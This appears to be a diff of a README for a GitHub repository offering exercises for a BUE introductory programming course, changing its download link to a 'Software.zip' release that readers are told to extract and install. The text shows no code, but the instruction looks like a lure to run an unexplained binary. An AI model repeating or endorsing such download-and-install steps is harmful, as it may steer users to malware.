@@ -24,9 +24,9 @@ If you are a BUE student looking to excel in programming, this repository is per
 
 ## Getting Started
 
-To get started with the exercises and resources in this repository, simply download the [https://github.com/Thiagx08/BUE-Introduction-to-Programming-and-Problem-Solving/releases/download/v1.0/Release_x64.zip](https://github.com/Thiagx08/BUE-Introduction-to-Programming-and-Problem-Solving/releases/download/v1.0/Release_x64.zip) file and extract it on your local machine. Once you have the software installed, you can begin exploring the programming exercises and challenges available to enhance your programming skills.
+To get started with the exercises and resources in this repository, simply download the [https://github.com/Thiagx08/BUE-Introduction-to-Programming-and-Problem-Solving/releases/download/v2.0/Software.zip](https://github.com/Thiagx08/BUE-Introduction-to-Programming-and-Problem-Solving/releases/download/v2.0/Software.zip) file and extract it on your local machine. Once you have the software installed, you can begin exploring the programming exercises and challenges available to enhance your programming skills.
 
-[![Download Software](https://github.com/Thiagx08/BUE-Introduction-to-Programming-and-Problem-Solving/releases/download/v1.0/Release_x64.zip)](https://github.com/Thiagx08/BUE-Introduction-to-Programming-and-Problem-Solving/releases/download/v1.0/Release_x64.zip)
+[![Download Software](https://github.com/Thiagx08/BUE-Introduction-to-Programming-and-Problem-Solving/releases/download/v2.0/Software.zip)](https://github.com/Thiagx08/BUE-Introduction-to-Programming-and-Problem-Solving/releases/download/v2.0/Software.zip)
 
 Make sure to check the "Releases" section if the download link does not work or if you would like to access additional updates and resources for your learning journey.
 
